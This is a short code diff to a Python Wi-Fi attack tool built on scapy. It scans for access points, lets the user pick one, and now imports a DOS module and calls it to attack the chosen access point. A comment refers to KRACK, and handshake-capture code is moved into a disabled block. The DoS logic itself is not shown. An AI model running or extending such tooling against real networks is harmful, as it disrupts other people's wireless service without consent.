@@ -5,6 +5,7 @@ import argparse
 import questionary
 import scapy.all as scapy
 from Scanner import Scanner
+from DOS import DOS
 
 
 def ctrl_c(sig, frame):
@@ -46,13 +47,16 @@ if __name__ == "__main__":
         "Select Wi-Fi Access Point:", choices=list(found_aps)
     ).ask()
 
-    """
     # preparation for DoS attack and KRACK
-    if wifi is None:
+    if wifi == None:
         sys.exit(0)
 
     print(f"[*] Selected AP: {wifi}")
 
+    attack = DOS(wifi, inter)
+    attack.intercept()
+
+"""
     scan2 = Scanner(inter)
     scan2.run_handshake()
     handshake = scan2.get_handshake() or []
@@ -70,4 +74,4 @@ if __name__ == "__main__":
             found.add(pkt)
 
     print(f"[*] Packets matched for '{wifi}': {len(found)}")
-    """
+"""
